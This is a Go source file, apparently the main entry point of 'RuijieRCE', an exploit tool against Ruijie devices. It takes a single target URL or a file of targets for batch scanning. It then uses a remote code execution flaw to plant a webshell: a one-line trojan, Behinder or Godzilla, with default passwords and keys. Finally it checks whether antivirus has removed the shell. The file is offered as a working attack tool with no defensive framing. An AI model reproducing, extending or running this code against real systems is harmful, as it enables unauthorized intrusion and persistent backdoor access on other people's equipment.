package main

import (
	"RuijieRCE/funcs"
	"RuijieRCE/task"
	"RuijieRCE/vars"
	"flag"
	"fmt"
	"runtime"
)

func init()  {
	runtime.GOMAXPROCS(runtime.NumCPU())
	flag.StringVar(&vars.URL, "u", "", "目标URL")
	flag.StringVar(&vars.FILE, "f", "", "导入.txt文件批量扫描")
	flag.StringVar(&vars.NAME,"n", "", "写入shell默认一句话马🐎，B冰蝎马，G哥斯拉马")
	flag.StringVar(&vars.PASS, "p", "", "写入shell密码，一句话马默认为cmd，哥斯拉马默认为pass，冰蝎马默认为rebeyond")
	flag.StringVar(&vars.KEY, "k", "", "写入shell密钥，一句话马默认为cmd，哥斯拉马默认为key，冰蝎马没有密钥")
}

func main() {
	flag.Parse()
	funcs.Menu()

	switch {
	case vars.URL != "" && vars.FILE == "":
		target, shellname := funcs.Url(vars.URL)
		name, pass, key := funcs.Config()
		switch name {

		case "":
			//写入一句话马
			shellcode := funcs.ShellCode(pass, key)
			urll, err := funcs.Rce(target, shellname, shellcode, vars.Header)
			if err != nil {
				fmt.Printf("\033[1;32m%s%v\033[0m\n", "[-]Error", err)
				return
			}
			if urll == "" {
				fmt.Printf("\033[1;32m%s\033[0m\n", "[-]" + target + "一句话马写入失败！")
				return
			}
			fmt.Printf("\033[1;31m%s\033[0m\n","[+]"+ urll+ "成功写入一句话马，正在检测是否被杀软删除！")
			funcs.Judge(urll, "shellcode", vars.Header)

		case "B":
			shellcode := funcs.Behinder(pass)
			urll, err := funcs.Rce(target, shellname, shellcode, vars.Header)
			if err != nil {
				fmt.Printf("\033[1;32m%s%v\033[0m\n", "[-]Error", err)
				return
			}
			if urll == "" {
				fmt.Printf("\033[1;32m%s\033[0m\n", "[-]" + target + "冰蝎马写入失败！")
				return
			}
			fmt.Printf("\033[1;31m%s\033[0m\n","[+]"+ urll+ "成功写入冰蝎马，正在检测是否被杀软删除！")
			funcs.Judge(urll, "Behinder", vars.Header)

		case "G":
			shellcode := funcs.Godzilla(pass, key)
			urll, err := funcs.Rce(target, shellname, shellcode, vars.Header)
			if err != nil {
				fmt.Printf("\033[1;32m%s%v\033[0m\n", "[-]Error", err)
				return
			}
			if urll == "" {
				fmt.Printf("\033[1;32m%s\033[0m\n", "[-]" + target + "哥斯拉马写入失败！")
				return
			}
			fmt.Printf("\033[1;31m%s\033[0m\n","[+]"+ urll+ "成功写入哥斯拉马，正在检测是否被杀软删除！")
			funcs.Judge(urll, "Godzilla", vars.Header)

		default:
			fmt.Printf("\033[1;32m%s\033[0m\n", "[-]请输入正确的-n参数，上传哥斯拉马请输入G，上传冰蝎马请输入B，一句话木马默认为空")
		}

	case vars.URL == "" && vars.FILE != "":
		task.Concurrent()

	default:
		fmt.Printf("\033[1;32m%s\033[0m\n", "[-]请输入正确的指令例如：./RuijieRCE -u https://127.0.0.1 -n G -p pass -k key")
	}
}